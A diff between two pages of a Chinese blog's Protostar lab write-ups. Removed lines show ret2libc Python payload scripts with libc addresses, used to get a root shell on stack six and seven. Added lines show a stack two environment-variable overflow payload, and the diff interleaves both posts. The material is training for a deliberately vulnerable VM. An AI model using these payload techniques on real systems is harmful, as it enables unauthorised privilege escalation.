-<h4 id="什么是libc库"><a href="#什么是libc库" class="headerlink" title="什么是libc库"></a>什么是libc库</h4><p>在编译程序时，我们要调用函数，为了缩小程序大小，我们通常会动态编译文件，程序调用函数时，就会到指定的libc库里查找并执行</p>
-<p>执行i proc mappings查看程序内存映射</p>
-<pre class="line-numbers language-none"><code class="language-none">i proc mappings<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731488032573.png" alt="1731488032573"></p>
-<p> stack6的libc库为：**/lib/libc-2.11.2.so<strong>，libc的基地址为：</strong>0xb7e97000** </p>
-<p> 现在新开一个终端，在libc库里查找/bin/sh字符串的地址 </p>
-<pre class="line-numbers language-none"><code class="language-none">strings -t d &#x2F;lib&#x2F;libc-2.11.2.so | grep &quot;&#x2F;bin&#x2F;sh&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731488182979.png" alt="1731488182979"></p>
-<p> 字符串/bin/sh的偏移地址为：<strong>1176511</strong>，<strong>libc的基地址+字符串的偏移地址=程序调用字符串的完整地址</strong> </p>
-<h3 id="寻找程序溢出大小"><a href="#寻找程序溢出大小" class="headerlink" title="寻找程序溢出大小"></a>寻找程序溢出大小</h3><p>查看main函数代码</p>
-<pre class="line-numbers language-none"><code class="language-none">disassemble main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731488272525.png" alt="1731488272525"></p>
-<p> 程序调用了getpath函数后，会返回0x08048505继续执行下一个指令，重新运行程序，随便输入一些字符，然后查看栈状态 </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731488402448.png" alt="1731488402448"></p>
-<p>我们输入的字符串离0x08048505有80个字节，在0x08048505上面还有一个0x08048505，那个只是普通的值，在程序返回main函数时，还会调用其他的系统函数，所以下一个才是getpath函数ret main函数的值 </p>
-<h3 id="脚本编写-1"><a href="#脚本编写-1" class="headerlink" title="脚本编写"></a>脚本编写</h3><p>现在我们可以写一个脚本来破解程序 </p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct
-
-<span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">80</span>   <span class="token operator">//</span>覆盖到ret地址的函数
-
-system <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span><span class="token number">0xb7ecffb0</span><span class="token punctuation">)</span>  <span class="token operator">//</span>system地址
-ret <span class="token operator">=</span> <span class="token string">"AAAA"</span>  <span class="token operator">//</span>在执行system函数时，会调用一个返回地址，这里随意输入一些字符，下图解释
-
-shellcode <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span><span class="token number">0xb7e97000</span><span class="token operator">+</span><span class="token number">1176511</span><span class="token punctuation">)</span>  <span class="token operator">//</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh字符串地址
-
-payload <span class="token operator">=</span> <span class="token builtin">buffer</span> <span class="token operator">+</span> system <span class="token operator">+</span> ret <span class="token operator">+</span> shellcode
-<span class="token keyword">print</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在执行system函数时，会调用一个返回地址，可以随意输入一些字符，然后就会执行”/bin/sh”字符串 </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731488571058.png" alt="1731488571058"></p>
-<p> 执行程序，成功获得root权限 </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731488765115.png" alt="1731488765115"></p>
-<h2 id="Stack-Seven"><a href="#Stack-Seven" class="headerlink" title="Stack Seven"></a>Stack Seven</h2><p>Stack Seven和Stack Six的程序源代码很像，只是修改了一下判断的值</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
-
-<span class="token keyword">void</span> <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//定义一个名为getpath的函数</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
-
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input path please: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出字符串input path please: </span>
-
-  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取用户输入，将输入存储到buffer函数变量里</span>
-
-  ret <span class="token operator">=</span> <span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//获取ret返回的内存地址</span>
-
-  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> <span class="token number">0xb0000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xb0000000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//如果内存地址的前一位是0xb</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bzzzt (%p)\n"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出bzzzt</span>
-    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">==</span> <span class="token number">0x0d0a0d0a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have correctly modified the variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again, you got 0x%08x\n"</span><span class="token punctuation">,</span> modified<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
 
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"got path %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出got path</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  <span class="token comment">//主函数</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用getpath函数</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>我们只需要多加一个ret指令的地址，让程序返回到我们指定的地方执行system函数和/bin/sh字符串 </p>
-<h3 id="寻找ret地址"><a href="#寻找ret地址" class="headerlink" title="寻找ret地址"></a>寻找ret地址</h3><p>我们可以使用objdump工具来寻找ret指令的地址</p>
-<pre class="line-numbers language-none"><code class="language-none">objdump -D stack7 | grep ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p> 这个程序代码和第一个差不多，只不过是将我们的输入变成了读取环境变量里的<strong>GREENIE</strong>变量内容 </p>
+<h3 id="什么是环境变量"><a href="#什么是环境变量" class="headerlink" title="什么是环境变量"></a>什么是环境变量</h3><p>任何计算机编程语言的两个基本组成部分，变量和常量。就像数学方程式中的自变量一样。变量和常量都代表唯一的内存位置，其中包含程序在其计算中使用的数据。两者的区别在于，变量在执行过程中可能会发生变化，而常量不能重新赋值</p>
+<p>这里只举几个常见的环境变量</p>
+<h4 id="PATH"><a href="#PATH" class="headerlink" title="$PATH"></a>$PATH</h4><p>包含了一些目录列表，作用是终端会在这些目录中搜索要执行的程序<br> 查看$PATH环境变量</p>
+<pre class="line-numbers language-none"><code class="language-none">echo $PATH<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731489119446.png" alt="1731489119446"></p>
-<p>这里有很多ret指令的地址，我们随便选一个即可开始写脚本</p>
-<p>脚本和stack six一样，只需要添加一个ret指令地址即可</p>
-<h3 id="脚本编写-2"><a href="#脚本编写-2" class="headerlink" title="脚本编写"></a>脚本编写</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct
+<h4 id="HOME"><a href="#HOME" class="headerlink" title="$HOME"></a>$HOME</h4><p>包含了当前用户的主目录</p>
+<pre class="line-numbers language-none"><code class="language-none">echo $HOME<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">80</span>
+<h4 id="PWD"><a href="#PWD" class="headerlink" title="$PWD"></a>$PWD</h4><p>包含了当前用户目前所在的目录位置</p>
+<pre class="line-numbers language-none"><code class="language-none">echo $PWD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-ret_addr <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token number">0x8048383</span><span class="token punctuation">)</span>
-system <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span><span class="token number">0xb7ecffb0</span><span class="token punctuation">)</span>
-ret <span class="token operator">=</span> <span class="token string">"AAAA"</span>
+<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Environment_variable">关于环境变量更多信息</a></p>
+<h3 id="破解程序"><a href="#破解程序" class="headerlink" title="破解程序"></a>破解程序</h3><p>回到正题</p>
+<pre class="line-numbers language-none"><code class="language-none">variable &#x3D; getenv(&quot;GREENIE&quot;);
+strcpy(buffer, variable);
 
-shellcode <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span><span class="token number">0xb7e97000</span><span class="token operator">+</span><span class="token number">1176511</span><span class="token punctuation">)</span>
+  if(modified &#x3D;&#x3D; 0x0d0a0d0a) &#123;
+      printf(&quot;you have correctly modified the variable\n&quot;);
+  &#125; else &#123;
+      printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
+  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-payload <span class="token operator">=</span> <span class="token builtin">buffer</span> <span class="token operator">+</span> ret_addr <span class="token operator">+</span>system<span class="token operator">+</span> ret <span class="token operator">+</span> shellcode
-<span class="token keyword">print</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>首先获取了一个名为GREENIE的环境变量，然后将内容赋予variable变量，之后if判断modified是否等于0x0d0a0d0a，这个和第一个程序一模一样，只不过我们不是通过输入来破解程序，而是将payload放到指定的环境变量里，然后程序读取环境变量 </p>
+<pre class="line-numbers language-none"><code class="language-none">export GREENIE&#x3D;$(python -c &quot;print &#39;A&#39;*(4*16)+&#39;\x0a\x0d\x0a\x0d&#39;&quot;); .&#x2F;stack2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731489222312.png" alt="1731489222312"></p>
-<p> 成功获得root权限 </p>
+<p> 直接运行就能成功破解了 </p>
+<p><img src="/img/1731310880852.png"></p>
 
                 
             </div>
@@ -629,7 +640,7 @@ payload <span class="token operator">=</span> <span class="token builtin">buffer
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Pr0b1em.github.io/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA4%20stack%20five,stack%20six,stack%20seven/">https://Pr0b1em.github.io/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA4%20stack%20five,stack%20six,stack%20seven/</a>
+                    <a href="https://Pr0b1em.github.io/2024/11/12/Pwn-protostar%E9%9D%B6%E5%9C%BA2%20stack%20one%EF%BC%8Cstack%20two/">https://Pr0b1em.github.io/2024/11/12/Pwn-protostar%E9%9D%B6%E5%9C%BA2%20stack%20one%EF%BC%8Cstack%20two/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -666,7 +677,11 @@ payload <span class="token operator">=</span> <span class="token builtin">buffer
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -747,13 +762,13 @@ payload <span class="token operator">=</span> <span class="token builtin">buffer
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA5%20heap%20zero/">
+                <a href="/2024/11/13/Pwn-protostar%E9%9D%B6%E5%9C%BA3%20stack%20three%EF%BC%8Cstack%20four/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Pwn-protostar靶场3 stack three，stack four">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">Pwn-protostar靶场3 stack three，stack four</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -764,15 +779,27 @@ payload <span class="token operator">=</span> <span class="token builtin">buffer
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-03
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-11-13
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Pr0b1em
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    学习
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -784,13 +811,13 @@ payload <span class="token operator">=</span> <span class="token builtin">buffer
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA3%20stack%20three%EF%BC%8Cstack%20four/">
+                <a href="/2024/11/11/Pwn-protostar%E9%9D%B6%E5%9C%BA1%20%20stack_zero/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="Pwn-protostar靶场1 stack_zero">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">Pwn-protostar靶场1 stack_zero</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -801,15 +828,27 @@ payload <span class="token operator">=</span> <span class="token builtin">buffer
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Pr0b1em
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    学习
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
                 </div>
                 
             </div>
